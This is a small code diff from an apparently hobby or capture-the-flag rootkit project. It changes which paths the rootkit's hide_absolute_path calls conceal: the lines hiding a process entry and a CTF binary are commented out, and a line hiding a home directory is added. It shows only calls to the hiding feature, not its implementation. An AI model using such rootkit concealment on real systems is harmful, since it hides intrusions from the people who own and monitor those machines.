@@ -29,8 +29,9 @@ void execute() {
 //    rootkit.run_plugin(remote_cli_id);
 
 
-    hide_absolute_path("/proc/2906");
-    hide_absolute_path("/home/idan/ctf/a.out");
+//    hide_absolute_path("/home/idan/ctf/a.out");
+    hide_absolute_path("/home/idan");
+//    hide_absolute_path("/proc/2906");
 
     reports_test();
 
